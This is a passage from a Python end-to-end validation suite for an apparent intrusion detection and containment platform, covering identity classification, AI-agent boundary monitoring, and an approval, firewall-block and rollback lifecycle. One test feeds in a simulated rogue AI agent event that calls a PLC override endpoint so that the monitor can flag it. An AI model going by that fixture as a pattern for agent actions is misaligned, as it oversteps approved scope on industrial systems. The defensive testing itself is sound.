                    "principal_name": "agent_procurement_ai",
                    "principal_type": "AI_AGENT",
                    "is_privileged": False,
                },
                "plc_smt_line1": {
                    "identity_id": str(uuid.uuid4()),
                    "principal_name": "plc_smt_line1",
                    "principal_type": "INDUSTRIAL_DEVICE",
                    "is_privileged": False,
                },
                "vendor_hexacore_dev": {
                    "identity_id": str(uuid.uuid4()),
                    "principal_name": "vendor_hexacore_dev",
                    "principal_type": "THIRD_PARTY_IDENTITY",
                    "is_privileged": False,
                },
            }

            id_engine = IdentityEngine(
                redis_client=sync_redis, identity_registry=identity_registry
            )
            ts_base = datetime(2026, 11, 18, 11, 0, tzinfo=IST)

            auth_cases = [
                ("rahul.sharma", "mfa", "10.10.10.21", "CORP-ERP-01", "HUMAN_USER"),
                ("svc_erp_sync", "certificate", "10.10.10.35", "CORP-ERP-01", "SERVICE_ACCOUNT"),
                ("ci_firmware_runner", "api_key", "10.10.20.2", "ENG-GITSVR-01", "AUTOMATION_WORKLOAD"),
                ("agent_procurement_ai", "api_key", "10.10.60.20", "API-GW-01", "AI_AGENT"),
                ("plc_smt_line1", "certificate", "10.10.30.10", "OT-HMI-SMTA-01", "INDUSTRIAL_DEVICE"),
                ("vendor_hexacore_dev", "mfa", "10.10.50.2", "DMZ-BASTION-01", "THIRD_PARTY_IDENTITY"),
                ("unregistered_actor", "password", "10.10.10.99", "CORP-FS-01", "UNKNOWN_IDENTITY"),
            ]

            observed_categories = set()
            for idx, (principal, method, src_ip, target, expected_cat) in enumerate(auth_cases):
                rec, _ = id_engine.process_auth_event(
                    {
                        "principal_name": principal,
                        "auth_method": method,
                        "source_ip": src_ip,
                        "target_resource": target,
                        "success": True,
                        "timestamp": ts_base + timedelta(minutes=idx),
                    },
                    persist=False,
                )
                ctx.check(
                    f"classify_{expected_cat.lower()}",
                    rec.identity_category == expected_cat,
                    f"{principal} ({method}) -> {rec.identity_category}",
                )
                observed_categories.add(rec.identity_category)

            ctx.check(
                "all_7_identity_categories_verified",
                observed_categories == set(VALID_IDENTITY_CATEGORIES),
                f"Verified all {len(observed_categories)} identity categories",
            )

            # 2. Verify AI Procurement Agent operational boundary monitoring
            boundary = AgentOperationalBoundary(
                identity_id="agent_procurement_ai",
                agent_name="BECPL Procurement Forecasting Agent",
                identity_category="AI_AGENT",
                approved_api_endpoints={"/api/v1/procurement/*", "/api/v1/suppliers/quotes"},
                approved_resource_types={"procurement_erp", "supplier_catalog"},
                approved_hours_ist=set(range(8, 20)),
                approved_source_networks=["10.10.60.0/24"],
                approved_tools={"fetch_bom_pricing", "draft_po"},
                normal_calls_per_minute=3.0,
            )
            agent_monitor = AIAgentMonitor(
                boundaries={"agent_procurement_ai": boundary},
                redis_client=sync_redis,
            )
            benign_agent_anoms = agent_monitor.evaluate_activity(
                AgentActivityEvent(
                    identity_id="agent_procurement_ai",
                    identity_category="AI_AGENT",
                    timestamp=ts_base,
                    source_ip="10.10.60.20",
                    api_endpoint="/api/v1/procurement/bom",
                    resource_type="procurement_erp",
                    tool_name="fetch_bom_pricing",
                )
            )
            rogue_agent_anoms = agent_monitor.evaluate_activity(
                AgentActivityEvent(
                    identity_id="agent_procurement_ai",
                    identity_category="AI_AGENT",
                    timestamp=ts_base + timedelta(seconds=10),
                    source_ip="10.10.60.20",
                    api_endpoint="/api/v1/ot/plc/override",
                    resource_type="plc_controller",
                    tool_name="exec_modbus_write",
                )
            )
            ctx.check(
                "ai_agent_boundary_enforced",
                len(benign_agent_anoms) == 0
                and any(
                    a.anomaly_type == "agent_unapproved_api_endpoint"
                    for a in rogue_agent_anoms
                ),
                f"Benign agent calls=0 anomalies; out-of-scope OT call raised {len(rogue_agent_anoms)} anomalies",
            )

            # 3. CRITICAL INVARIANT: Zero false AI_AGENT (or any identity) attributions from raw packets alone
            assets_db = {
                "10.10.60.20": {
                    "asset_id": "CLOUD-AI-PROC-01",
                    "hostname": "ai-procurement-agent.cloud.becpl",
                    "ip_str": "10.10.60.20",
                    "vlan_id": 60,
                    "zone_name": "Cloud",
                    "zone_type": "cloud",
                    "device_type": "container",
                    "criticality": "medium",
                    "owner_department": "Procurement",
                    "identity_classification": "AI_AGENT",
                },
                "10.10.10.35": {
                    "asset_id": "CORP-ERP-SYNC-01",
                    "hostname": "erp-batch.corp.becpl",
                    "ip_str": "10.10.10.35",
                    "vlan_id": 10,
                    "zone_name": "Corporate_IT",
                    "zone_type": "corporate",
                    "device_type": "server",
                    "criticality": "high",
                    "owner_department": "Finance",
                    "identity_classification": "SERVICE_ACCOUNT",
                },
                "10.10.10.21": {
                    "asset_id": "CORP-WS-001",
                    "hostname": "corp-ws-001.becpl",
                    "ip_str": "10.10.10.21",
                    "vlan_id": 10,
                    "zone_name": "Corporate_IT",
                    "zone_type": "corporate",
                    "device_type": "workstation",
                    "criticality": "medium",
                    "owner_department": "Operations",
                    "identity_classification": "HUMAN_USER",
                },
            }
            enricher = AssetIdentityEnricher(
                redis_client=async_redis,
                db_pool=_AsyncDBPool(assets=assets_db, identities=identity_registry),
            )

            packet_only_sources = ["10.10.60.20", "10.10.10.35", "10.10.10.21"]
            false_agent_attributions = 0
            non_unknown_packet_attributions = 0
            total_packet_flows = 60
            for idx in range(total_packet_flows):
                src_ip = packet_only_sources[idx % len(packet_only_sources)]
                pkt_ev = StandardSecurityEvent(
                    sensor_id="SENSOR-CLOUD-01",
                    source_ip=src_ip,
                    destination_ip="10.10.10.10",
                    source_port=45000 + idx,
                    destination_port=443,
                    protocol="TCP",
                    event_type=EventType.NETWORK_FLOW,
                    detection_source=DetectionSource.ZEEK,
                    evidence={},  # NO explicit authentication/principal telemetry
                )
                enriched = _run_coro(enricher.enrich(pkt_ev))
                if enriched.principal_type == PrincipalType.AI_AGENT:
                    false_agent_attributions += 1
                if enriched.principal_type != PrincipalType.UNKNOWN_IDENTITY:
                    non_unknown_packet_attributions += 1

            ctx.check(
                "zero_false_agent_attributions_from_packets",
                false_agent_attributions == 0 and non_unknown_packet_attributions == 0,
                f"Evaluated {total_packet_flows} packet-only flows (including from AI_AGENT host IP 10.10.60.20): 0 false AI_AGENT attributions, 100% UNKNOWN_IDENTITY",
            )

            return (
                f"7-way identity classification verified across mixed auth telemetry with 0/{total_packet_flows} false AI_AGENT attributions from packet analysis alone.",
                {
                    "identity_categories_verified": sorted(observed_categories),
                    "packet_only_flows_tested": total_packet_flows,
                    "false_agent_attributions": false_agent_attributions,
                    "ai_agent_boundary_anomalies_detected": len(rogue_agent_anoms),
                },
            )

        return self._execute_scenario(
            "TEST-09",
            "Human vs Service vs Agent Identity Classification",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 10: Isolation, Authorization & Rollback Life Cycle
    # ------------------------------------------------------------------
    def run_test_10_isolation_authorization_rollback(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            redis = _SyncRedisMock()
            pg_conn = _RecordingPostgresConn()
            t0 = datetime(2026, 11, 18, 22, 45, 0, tzinfo=timezone.utc)

            # 1. Trigger high-priority incident (RULE-CORP-002 Credential Compromise + Movement)
            corr_engine = CorrelationEngine(db_client=pg_conn, redis_client=redis)
            corr_engine.ingest_event(
                "detections:identity",
                {
                    "event_id": "lc-auth-001",
                    "timestamp": t0.isoformat(),
                    "event_type": "identity_anomaly",
                    "anomaly_type": "off_hours",
                    "identity": "rajesh.sharma",
                    "source_asset_id": "CORP-WS-005",
                    "source_vlan": 10,
                },
            )
            inc_res = corr_engine.ingest_event(
                "detections:anomaly",
                {
                    "event_id": "lc-net-001",
                    "timestamp": (t0 + timedelta(minutes=8)).isoformat(),
                    "event_type": "network_anomaly",
                    "anomaly_type": "new_destination",
                    "identity": "rajesh.sharma",
                    "source_asset_id": "CORP-WS-005",
                    "destination_asset_id": "CORP-ERP-01",
                    "source_vlan": 10,
                },
            )
            hi_inc = next(
                (i for i in inc_res if i.rule_id == "RULE-CORP-002"), None
            )
            ctx.check(
                "high_priority_incident_triggered",
                hi_inc is not None and hi_inc.severity == "high",
                f"Triggered {hi_inc.incident_reference if hi_inc else None} (severity={hi_inc.severity if hi_inc else None})",
            )
            assert hi_inc is not None

            # 2. Generate 10-field ActionProposal in MODE 3
            policy_engine = ContainmentPolicyEngine(db_conn=pg_conn)
            approval_engine = ApprovalEngine(
                policy_engine=policy_engine,
                db_conn=pg_conn,
                redis_client=redis,
                identities=_seed_soc_identities(),
            )
            fw_mgr = SimulatedFirewallManager()
            fw_adapter = FirewallAdapter(firewall_manager=fw_mgr)
            corr_status_log: List[Tuple[uuid.UUID, str]] = []
            executor = ContainmentActionExecutor(
                policy_engine=policy_engine,
                approval_engine=approval_engine,
                adapters={ActionCategory.NETWORK_CONTAINMENT: fw_adapter},
                db_conn=pg_conn,
                redis_client=redis,
                correlation_notifier=lambda iid, st, _d: corr_status_log.append((iid, st)),
            )

            target_asset = AffectedAsset(
                asset_id="CORP-WS-005",
                hostname="corp-ws-005.becpl.in",
                vlan_id=10,
                criticality="medium",
                device_type="workstation",
                ip_address="10.10.10.25",
            )
            proposal = policy_engine.propose_action(
                incident_id=uuid.UUID(hi_inc.incident_id),
                affected_asset=target_asset,
                action_category=ActionCategory.NETWORK_CONTAINMENT,
                reason_for_isolation="Compromised off-hours credential lateral access from CORP-WS-005 to CORP-ERP-01",
                supporting_evidence=["lc-auth-001", "lc-net-001"],
                parameters={
                    "src_ip": "10.10.10.25",
                    "dst_ip": "10.10.10.10",
                    "port": 8443,
                },
                initiated_by="operator@becpl.in",
            )
            prop_dict = proposal.to_dict()
            missing_fields = [
                f for f in ActionProposal.MANDATORY_FIELDS if f not in prop_dict
            ]
            ctx.check(
                "all_10_mandatory_action_proposal_fields_present",
                len(ActionProposal.MANDATORY_FIELDS) == 10 and len(missing_fields) == 0,
                f"Verified all 10 mandatory ActionProposal fields ({len(ActionProposal.MANDATORY_FIELDS)}/10)",
            )

            # 3. Validate RBAC role authorization (ANALYST & OPERATOR blocked; invalid MFA blocked)
            analyst_blocked = False
            operator_blocked = False
            bad_mfa_blocked = False
            try:
                approval_engine.approve_action(
                    proposal.action_id, "analyst@becpl.in", Role.ANALYST, "152847"
                )
            except AuthorizationError:
                analyst_blocked = True
            try:
                approval_engine.approve_action(
                    proposal.action_id, "operator@becpl.in", Role.OPERATOR, "152847"
                )
            except AuthorizationError:
                operator_blocked = True
            try:
                approval_engine.approve_action(
                    proposal.action_id, "approver1@becpl.in", Role.APPROVER, "999999"
                )
            except AuthenticationError:
                bad_mfa_blocked = True

            ctx.check(
                "rbac_and_mfa_guards_enforced",
                analyst_blocked and operator_blocked and bad_mfa_blocked,
                "RBAC blocked ANALYST & OPERATOR; invalid MFA token '999999' rejected",
            )

            # 4. Approve with authorized APPROVER + valid simulated MFA token & execute
            appr_res = approval_engine.approve_action(
                action_id=proposal.action_id,
                approver_identity="approver1@becpl.in",
                approver_role=Role.APPROVER,
                mfa_token="152847",
            )
            exec_res = executor.execute_action(proposal.action_id)
            rule_enforced = fw_mgr.check_rule_exists(
                "10.10.10.25", "10.10.10.10", "TCP", 8443, "BLOCK"
            )
            ctx.check(
                "mfa_approved_and_enforced",
                appr_res.approved
                and appr_res.approval_method == ApprovalMethod.MFA_TOKEN.value
                and exec_res.success
                and proposal.execution_status == ActionStatus.COMPLETED.value
                and rule_enforced
                and corr_status_log[-1][1] == "contained",
                "MFA-approved block rule executed; firewall rule active & incident marked contained",
            )

            # 5. Confirm PostgreSQL audit logging (becpl_nids.audit_log & response_actions)
            pg_audit_inserts_before_rb = pg_conn.statements_matching(
                "INSERT INTO becpl_nids.audit_log"
            )
            pg_response_writes = pg_conn.statements_matching("becpl_nids.response_actions")
            ctx.check(
                "postgresql_audit_logging_confirmed",
                len(pg_audit_inserts_before_rb) >= 2
                and len(pg_response_writes) >= 2
                and pg_conn.commits >= 2,
                f"PostgreSQL captured {len(pg_audit_inserts_before_rb)} audit_log INSERTs and {len(pg_response_writes)} response_actions writes",
            )

            # 6. Execute rollback & verify full state restoration
            rb_res = executor.rollback_action(
                action_id=proposal.action_id,
                actor_identity="ciso@becpl.in",
                reason="Credential reset verified; restoring ERP access",
            )
            pg_audit_inserts_after_rb = pg_conn.statements_matching(
                "INSERT INTO becpl_nids.audit_log"
            )
            rule_deactivated = not fw_mgr.check_rule_exists(
                "10.10.10.25", "10.10.10.10", "TCP", 8443, "BLOCK"
            )
            ctx.check(
                "rollback_and_state_restoration_verified",
                rb_res.success
                and proposal.execution_status == ActionStatus.ROLLED_BACK.value
                and rule_deactivated
                and len(fw_adapter.list_active_rules()) == 0
                and corr_status_log[-1][1] == "investigating"
                and len(pg_audit_inserts_after_rb) > len(pg_audit_inserts_before_rb),
                f"Rollback restored firewall state (0 active rules), updated incident to investigating, and wrote rollback audit_log entry ({len(pg_audit_inserts_after_rb)} total)",
            )

            return (
                "Full containment lifecycle validated: 10-field ActionProposal -> RBAC/MFA gates -> execution -> PostgreSQL audit_log persistence -> clean rollback & state restoration.",
                {
                    "incident_reference": hi_inc.incident_reference,
                    "mandatory_proposal_fields_verified": len(ActionProposal.MANDATORY_FIELDS),
                    "postgresql_audit_log_inserts": len(pg_audit_inserts_after_rb),
                    "postgresql_commits": pg_conn.commits,
                    "active_firewall_rules_after_rollback": len(fw_adapter.list_active_rules()),
                    "final_action_status": proposal.execution_status,
                },
            )

        return self._execute_scenario(
            "TEST-10",
            "Isolation, Authorization & Rollback Life Cycle",
            _impl,
        )

    # ------------------------------------------------------------------
    # Run All 10 Validation Scenarios
    # ------------------------------------------------------------------
    def run_all(self) -> ValidationSuiteReport:
        """Execute all 10 Section 13 validation tests in order and build a summary report."""
        t0 = time.perf_counter()
        runners = (
            self.run_test_01_third_party_compromise,
            self.run_test_02_lateral_movement,
            self.run_test_03_lotl_activity,
            self.run_test_04_encrypted_exfil,
            self.run_test_05_unknown_attack_heldout,
            self.run_test_06_vulnerability_exploitation_ladder,
            self.run_test_07_industrial_modbus_safety,
            self.run_test_08_high_load_stress_test,
            self.run_test_09_identity_classification,
            self.run_test_10_isolation_authorization_rollback,
        )
        results = [runner() for runner in runners]
        total_duration_ms = (time.perf_counter() - t0) * 1000.0

        passed_tests = sum(1 for r in results if r.passed)
        failed_tests = len(results) - passed_tests
        total_assertions = sum(r.assertions_total for r in results)
        total_assertions_passed = sum(r.assertions_passed for r in results)

        return ValidationSuiteReport(
            suite_name="VaultX Phase 3 End-to-End Validation Suite (Section 13)",
            organisation="Bharat Electronics Components Pvt. Ltd. (BECPL), Pune",
            executed_at=datetime.now(timezone.utc).isoformat(),
            total_tests=len(results),
            passed_tests=passed_tests,
            failed_tests=failed_tests,
            pass_rate_pct=(passed_tests / len(results) * 100.0) if results else 0.0,
            total_duration_ms=total_duration_ms,
            total_assertions_passed=total_assertions_passed,
            total_assertions=total_assertions,
            results=results,
        )

    def export_report(
        self,
        report: ValidationSuiteReport,
        output_path: Path | str,
    ) -> Path:
        """Write the validation suite report as formatted JSON."""
        out = Path(output_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(json.dumps(report.to_dict(), indent=2), encoding="utf-8")
        return out
